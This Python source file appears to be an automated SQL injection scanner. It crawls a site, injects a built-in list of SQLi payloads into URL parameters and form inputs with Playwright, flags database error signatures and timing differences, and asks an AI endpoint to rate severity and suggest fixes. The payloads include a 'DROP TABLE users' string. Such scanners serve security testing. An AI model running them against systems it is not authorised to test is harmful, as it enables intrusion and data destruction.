import asyncio
import logging
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from urllib.parse import urlencode, urlparse, parse_qs
from datetime import datetime
from tqdm import tqdm
from crawler import dfs
from playwright.async_api import async_playwright, BrowserContext
from dotenv import load_dotenv
import requests
import os

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv(os.path.join(os.path.dirname(__file__), "..", ".env"))

AI_API_URL = os.getenv("AI_API_URL", "http://127.0.0.1:8000/analyze")

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
    "admin' --", "admin' #", "' or 'a'='a",
    "' UNION SELECT NULL --", "' UNION SELECT NULL, NULL --", "' UNION SELECT NULL, NULL, NULL --",
    "' AND SLEEP(5) --", "' AND pg_sleep(5) --", "'; WAITFOR DELAY '00:00:05' --",
    "' AND '1'='1", "' AND '1'='2",
    "' AND extractvalue(rand(),concat(0x3a,version())) --",
    "' AND updatexml(rand(),concat(0x3a,version()),1) --",
    "' /*", "'; DROP TABLE users --", "%27 OR %271%27=%271",
]

ERROR_SIGNATURES = [
    "SQL syntax", "syntax error", "MySQL", "PostgreSQL", "Oracle", "MSSQL", "sqlite",
    "database error", "You have an error in your SQL", "Warning: mysql_",
    "Uncaught PDOException", "ORA-", "SQL Server error",
]


@dataclass
class SQLiTestResult:
    url: str
    parameter: Optional[str] = None
    payload: str = ""
    test_type: str = ""
    vulnerable: bool = False
    confidence: float = 0.0
    ai_severity: str = "UNKNOWN"
    ai_confidence: float = 0.0
    fix: str = ""
    response_time: float = 0.0
    status_code: int = 0
    error_message: Optional[str] = None
    evidence: Optional[str] = None
    form_action: Optional[str] = None
    form_method: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict:
        return {
            "url": self.url, "parameter": self.parameter, "payload": self.payload,
            "test_type": self.test_type, "vulnerable": self.vulnerable,
            "confidence": self.confidence, "ai_severity": self.ai_severity,
            "ai_confidence": self.ai_confidence, "fix": self.fix,
            "response_time": self.response_time, "status_code": self.status_code,
            "error_message": self.error_message, "evidence": self.evidence,
            "form_action": self.form_action, "form_method": self.form_method,
            "timestamp": self.timestamp.isoformat(),
        }


class SQLInjectionTester:
    def __init__(self, page_timeout_ms: int = 30000, time_threshold_ms: float = 4000,
        check_errors: bool = True, check_union: bool = True, check_time_based: bool = True,
        use_ai: bool = True, ai_confirmation_threshold: float = 0.5,
        max_concurrent_payloads: int = 4, idle_timeout_ms: int = 2000,
        payload_hard_timeout_s: float = 15.0):
        self.page_timeout_ms = page_timeout_ms
        self.idle_timeout_ms = idle_timeout_ms
        self.time_threshold_ms = time_threshold_ms
        self.check_errors = check_errors
        self.check_union = check_union
        self.check_time_based = check_time_based
        self.use_ai = use_ai
        self.ai_confirmation_threshold = ai_confirmation_threshold
        self.results: List[SQLiTestResult] = []
        self.payload_hard_timeout_s = payload_hard_timeout_s
        self._semaphore = asyncio.Semaphore(max_concurrent_payloads)
        self._ai_cache: Dict[str, Dict] = {}
        self._http_session = requests.Session()

    async def _call_ai_api(self, payload: str, response_text: str = "", language: str = "unknown") -> Dict:
        if not self.use_ai:
            return {"severity": "UNKNOWN", "confidence": 0.0, "fix": ""}

        cache_key = f"{payload}::{response_text[:500]}"
        if cache_key in self._ai_cache:
            return self._ai_cache[cache_key]

        def _do_request():
            try:
                result = self._http_session.post(AI_API_URL, json={
                    "payload": payload, "parameter": "", "url": "",
                    "vulnerable_code": response_text[:2000] if response_text else "",
                    "language": language
                }, timeout=15)
                if result.status_code == 200:
                    data = result.json()
                    return {"severity": data.get("severity", "UNKNOWN"),
                        "confidence": data.get("confidence", 0.0), "fix": data.get("fix", "")}
                return {"severity": "UNKNOWN", "confidence": 0.0, "fix": ""}
            except Exception:
                return {"severity": "UNKNOWN", "confidence": 0.0, "fix": ""}

        ai_result = await asyncio.to_thread(_do_request)
        self._ai_cache[cache_key] = ai_result
        return ai_result

    @staticmethod
    def _css_attr_selector(name: str) -> str:
        safe_name = name.replace("\\", "\\\\").replace("'", "\\'")
        return f"input[name='{safe_name}']"

    def _detect_error_based_sqli(self, response_text: str, baseline: Optional[str] = None) -> tuple:
        if not self.check_errors:
            return False, None
        baseline_lower = (baseline or "").lower()
        for signature in ERROR_SIGNATURES:
            sig_lower = signature.lower()
            if sig_lower in response_text.lower() and sig_lower not in baseline_lower:
                return True, signature
        return False, None

    def _detect_union_based_sqli(self, response_text: str, baseline: str, status_code: int = 200) -> bool:
        if not self.check_union or not (200 <= status_code < 300) or not baseline or len(baseline) < 200:
            return False
        ratio = len(response_text) / len(baseline)
        return ratio > 1.5 or ratio < 0.5

    def _calculate_confidence(self, has_error: bool, has_union_diff: bool, response_time: float, payload: str) -> float:
        c = 0.0
        if has_error: c += 0.7
        if has_union_diff: c += 0.3
        if ("SLEEP" in payload.upper() or "WAITFOR" in payload.upper()) and response_time > self.time_threshold_ms: c += 0.5
        return min(1.0, c)

    def _is_rule_candidate(self, has_error: bool, has_union_diff: bool, response_time: float) -> bool:
        return has_error or has_union_diff or response_time > self.time_threshold_ms

    async def _get_baseline(self, context: BrowserContext, url: str) -> Optional[str]:
        try:
            page = await context.new_page()
            page.set_default_timeout(self.page_timeout_ms)
            await page.goto(url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
            try:
                await page.wait_for_load_state("networkidle", timeout=self.idle_timeout_ms)
            except Exception:
                pass
            content = await page.content()
            await page.close()
            return content
        except Exception:
            return None

    async def _test_one_url_payload(self, context: BrowserContext, parsed, params: Dict,
        param_name: str, payload: str, baseline_response: Optional[str]) -> Optional[SQLiTestResult]:
        try:
            return await asyncio.wait_for(
                self._do_test_one_url_payload(context, parsed, params, param_name, payload, baseline_response),
                timeout=self.payload_hard_timeout_s,
            )
        except asyncio.TimeoutError:
            logger.warning(f"[TIMEOUT] {param_name}={payload!r} exceeded {self.payload_hard_timeout_s}s, skipping")
            return None

    async def _do_test_one_url_payload(self, context: BrowserContext, parsed, params: Dict,
        param_name: str, payload: str, baseline_response: Optional[str]) -> Optional[SQLiTestResult]:
        async with self._semaphore:
            test_params = params.copy()
            test_params[param_name] = [payload]
            flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(flat_params)}"
            page = None
            try:
                page = await context.new_page()
                page.set_default_timeout(self.page_timeout_ms)
                start_time = time.time()
                response = await page.goto(test_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
                try:
                    await page.wait_for_load_state("networkidle", timeout=self.idle_timeout_ms)
                except Exception:
                    pass
                response_text = await page.content()
                response_time = (time.time() - start_time) * 1000
                status_code = response.status if response else 0

                has_error, error_sig = self._detect_error_based_sqli(response_text, baseline_response)
                has_union_diff = self._detect_union_based_sqli(response_text, baseline_response, status_code) if baseline_response else False
                is_candidate = self._is_rule_candidate(has_error, has_union_diff, response_time)

                if is_candidate:
                    ai = await self._call_ai_api(payload, response_text)
                    ai_sev, ai_conf, ai_fix = ai["severity"], ai["confidence"], ai["fix"]
                else:
                    ai_sev, ai_conf, ai_fix = "UNKNOWN", 0.0, ""

                is_vuln = is_candidate and ai_conf >= self.ai_confirmation_threshold
                if is_vuln:
                    result = SQLiTestResult(url=test_url, parameter=param_name, payload=payload,
                        test_type="url_param", vulnerable=True, confidence=ai_conf,
                        ai_severity=ai_sev, ai_confidence=ai_conf, fix=ai_fix,
                        response_time=response_time, status_code=status_code,
                        error_message=error_sig, evidence=response_text[:500] if has_error else None)
                    logger.warning(f"[VULNERABLE] {param_name} in {test_url} - {payload} - {ai_sev}")
                    return result
                return None
            except Exception:
                return None
            finally:
                if page:
                    try:
                        await page.close()
                    except Exception:
                        pass

    async def test_url_parameter(self, context: BrowserContext, base_url: str, param_name: str,
        baseline_response: Optional[str] = None) -> List[SQLiTestResult]:
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if param_name not in params:
            return []

        if not baseline_response:
            baseline_response = await self._get_baseline(context, base_url)

        tasks = [
            self._test_one_url_payload(context, parsed, params, param_name, payload, baseline_response)
            for payload in SQL_INJECTION_PAYLOADS
        ]
        outcomes = await asyncio.gather(*tasks)
        results = [r for r in outcomes if r is not None]
        self.results.extend(results)
        return results

    async def _extract_csrf_tokens(self, page) -> Dict[str, str]:
        tokens = {}
        try:
            for el in await page.query_selector_all('input[type="hidden"]'):
                try:
                    n, v = await el.get_attribute("name"), await el.get_attribute("value")
                    if n and v: tokens[n] = v
                except Exception:
                    pass
            meta = await page.query_selector('meta[name="csrf-token"]')
            if meta:
                try:
                    v = await meta.get_attribute("content")
                    if v: tokens["_csrf"] = v
                except Exception:
                    pass
        except Exception:
            pass
        return tokens

    async def _fill_form_field_safe(self, page, selector: str, value: str, retries: int = 3) -> bool:
        for _ in range(retries):
            try:
                await page.wait_for_selector(selector, timeout=3000)
                await page.fill(selector, value, timeout=5000)
                return True
            except Exception:
                pass
        return False

    async def _test_one_form_payload(self, context: BrowserContext, action: str, method: str,
        inputs: List[str], input_name: str, payload: str, base_url: str,
        baseline_response: Optional[str]) -> Optional[SQLiTestResult]:
        try:
            return await asyncio.wait_for(
                self._do_test_one_form_payload(context, action, method, inputs, input_name, payload, base_url, baseline_response),
                timeout=self.payload_hard_timeout_s,
            )
        except asyncio.TimeoutError:
            logger.warning(f"[TIMEOUT] {input_name}={payload!r} on {action} exceeded {self.payload_hard_timeout_s}s, skipping")
            return None

    async def _do_test_one_form_payload(self, context: BrowserContext, action: str, method: str,
        inputs: List[str], input_name: str, payload: str, base_url: str,
        baseline_response: Optional[str]) -> Optional[SQLiTestResult]:
        async with self._semaphore:
            selector = self._css_attr_selector(input_name)
            page = None
            try:
                page = await context.new_page()
                page.set_default_timeout(self.page_timeout_ms)
                await page.goto(base_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
                try:
                    await page.wait_for_load_state("networkidle", timeout=self.idle_timeout_ms)
                except Exception:
                    pass
                fresh_tokens = await self._extract_csrf_tokens(page)
                start_time = time.time()
                status_code = 200

                if method == "post":
                    if not await self._fill_form_field_safe(page, selector, payload):
                        return None
                    for tn, tv in fresh_tokens.items():
                        try:
                            await page.fill(self._css_attr_selector(tn), tv, timeout=2000)
                        except Exception:
                            pass
                    last_status = []
                    page.on("response", lambda r: last_status.append(r.status) if r.request.resource_type == "document" else None)
                    try:
                        await page.click("button[type='submit'], input[type='submit']", timeout=3000)
                    except Exception:
                        try:
                            await page.press(selector, "Enter", timeout=3000)
                        except Exception:
                            pass
                    try:
                        await page.wait_for_load_state("networkidle", timeout=self.idle_timeout_ms)
                    except Exception:
                        pass
                    if last_status:
                        status_code = last_status[-1]
                else:
                    form_inputs = {fn: payload if fn == input_name else "test" for fn in inputs}
                    form_inputs.update(fresh_tokens)
                    test_url = f"{action}?{urlencode(form_inputs)}"
                    r = await page.goto(test_url, timeout=self.page_timeout_ms, wait_until="domcontentloaded")
                    try:
                        await page.wait_for_load_state("networkidle", timeout=self.idle_timeout_ms)
                    except Exception:
                        pass
                    status_code = r.status if r else 0

                response_time = (time.time() - start_time) * 1000
                response_text = await page.content()
                has_error, error_sig = self._detect_error_based_sqli(response_text, baseline_response)
                has_union_diff = self._detect_union_based_sqli(response_text, baseline_response, status_code) if baseline_response else False
                is_candidate = self._is_rule_candidate(has_error, has_union_diff, response_time)

                if is_candidate:
                    ai = await self._call_ai_api(payload, response_text)
                    ai_sev, ai_conf, ai_fix = ai["severity"], ai["confidence"], ai["fix"]
                else:
                    ai_sev, ai_conf, ai_fix = "UNKNOWN", 0.0, ""

                is_vuln = is_candidate and ai_conf >= self.ai_confirmation_threshold
                if is_vuln:
                    result = SQLiTestResult(url=action, parameter=input_name, payload=payload,
                        test_type="form_input", vulnerable=True, confidence=ai_conf,
                        ai_severity=ai_sev, ai_confidence=ai_conf, fix=ai_fix,
                        response_time=response_time, status_code=status_code,
                        error_message=error_sig, evidence=response_text[:500] if has_error else None,
                        form_action=action, form_method=method)
                    logger.warning(f"[VULNERABLE] {input_name} in {action} - {payload} - {ai_sev}")
                    return result
                return None
            except Exception:
                return None
            finally:
                if page:
                    try:
                        await page.close()
                    except Exception:
                        pass

    async def test_form(self, context: BrowserContext, form_data: Dict, base_url: str) -> List[SQLiTestResult]:
        action = form_data.get("action", base_url)
        method = form_data.get("method", "get").lower()
        inputs = form_data.get("inputs", [])
        if not inputs:
            return []

        baseline_response = await self._get_baseline(context, action)

        results: List[SQLiTestResult] = []
        for input_name in inputs:
            tasks = [
                self._test_one_form_payload(context, action, method, inputs, input_name, payload, base_url, baseline_response)
                for payload in SQL_INJECTION_PAYLOADS
            ]
            outcomes = await asyncio.gather(*tasks)
            results.extend(r for r in outcomes if r is not None)

        self.results.extend(results)
        return results

    async def test_crawler_results(self, crawl_results) -> List[SQLiTestResult]:
        all_results = []
        crawl_list = list(crawl_results)
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=True)
            context = await browser.new_context()
            await context.route("**/*", lambda route: route.abort() if route.request.resource_type in {"image", "media", "font"} else route.continue_())
            with tqdm(total=len(crawl_list), desc="Testing pages", unit=" pages", colour="green") as pbar:
                for cr in crawl_list:
                    if cr.params:
                        for p in cr.params:
                            r = await self.test_url_parameter(context, cr.url, p)
                            all_results.extend(r)
                    if cr.forms:
                        for f in cr.forms:
                            r = await self.test_form(context, f, cr.url)
                            all_results.extend(r)
                    pbar.update(1)
            await browser.close()
        return all_results

    def get_results(self) -> List[SQLiTestResult]: return self.results
    def get_vulnerable_results(self) -> List[SQLiTestResult]: return [r for r in self.results if r.vulnerable]

    def get_summary(self) -> Dict:
        vulnerable = self.get_vulnerable_results()
        return {"total_tests": len(self.results), "vulnerabilities_found": len(vulnerable),
            "ai_critical_count": sum(1 for r in vulnerable if r.ai_severity == "CRITICAL"),
            "severity_distribution": {"high": sum(1 for r in vulnerable if r.confidence > 0.7),
                "medium": sum(1 for r in vulnerable if 0.5 < r.confidence <= 0.7),
                "low": sum(1 for r in vulnerable if r.confidence <= 0.5)},
            "affected_parameters": list({r.parameter for r in vulnerable if r.parameter is not None}),
            "affected_urls": list(set(r.url for r in vulnerable))}

    def print_summary(self):
        s = self.get_summary()
        print("\n" + "=" * 80 + "\nSQL INJECTION TEST SUMMARY\n" + "=" * 80)
        print(f"Total Tests: {s['total_tests']}\nVulnerabilities Found: {s['vulnerabilities_found']}")
        print(f"AI CRITICAL: {s['ai_critical_count']}")
        if s['affected_parameters']: print(f"\nAffected Parameters: {', '.join(s['affected_parameters'])}")
        if s['affected_urls']:
            print("\nAffected URLs:")
            for u in s['affected_urls'][:10]: print(f"  - {u}")
        print("=" * 80 + "\n")


async def run_example():
    crawler = dfs.DFSCrawler(base_url="https://target-site.com", max_depth=2, concurrency=3)
    tester = SQLInjectionTester(page_timeout_ms=30000, time_threshold_ms=4000,
        check_errors=True, check_union=True, check_time_based=True, use_ai=True)
    results = []
    async for cr in crawler.crawl():
        results.append(cr)
    await tester.test_crawler_results(results)
    tester.print_summary()
    for v in tester.get_vulnerable_results():
        print(f"[{v.test_type.upper()}] {v.url}\n  Param: {v.parameter}\n  Payload: {v.payload}")
        print(f"  AI: {v.ai_severity} ({v.ai_confidence:.2%})\n  Fix: {v.fix}\n")


if __name__ == "__main__":
    asyncio.run(run_example())